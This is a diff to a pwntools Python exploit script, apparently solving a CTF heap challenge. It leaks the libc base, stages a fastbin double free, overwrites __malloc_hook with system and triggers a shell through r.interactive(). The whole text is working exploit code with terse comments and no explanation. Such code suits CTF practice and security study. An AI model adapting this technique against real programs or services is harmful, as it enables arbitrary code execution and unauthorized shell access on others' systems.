@@ -54,13 +54,27 @@ r.recvuntil('Note 1:\n  Data: ')
 libc_base = u64(r.recv(6) + '\0\0') - 0x3c4b78
 print('libc_base --> ', hex(libc_base))
 
-binsh = libc_base + libc.search('/bin/sh').next()
-pause()
+add(0x58, '\xaa' * 8, '\xaa' * 0x30) # n4
+add(0x58, '\xaa' * 8, '\xbb' * 0x30) # n5
+delete(4)
+delete(5)
 
-# now n0, n2, n3 still alive, n1 will have double free error, so use free(n2), free(n3) free(n2) for fastbin attack
+# self-opening another place to do double free shit
 delete(2)
 delete(3)
-# buff n[0], to make n[1], is_freed flag freeable
-add(0x18, '\x18' * 8, '\x18' * 0x30) # n1
-delete(2)
+add(0x18, '\xaa' * 8, '\xaa' * 0x2f) # n4
+add(0x18, '\xaa' * 8, '\xbb' * 0x30) # n5
+delete(4)
+
+malloc_hook = libc_base + libc.sym.__malloc_hook - 0x13 # shift for 0x7f like padding
+add(0x58, p64(malloc_hook), 'MALLOC_HOOK')
+add(0x58, '\x18', '\x87' * 48)
+
+binsh = libc_base + libc.search('/bin/sh').next()
+system = libc_base + libc.sym.system
+add(0x58, p64(system), 'BIN_SH')
+
+r.recvuntil('>')
+r.sendline('1')
+r.sendlineafter('Size: ', p64(binsh))
 r.interactive()
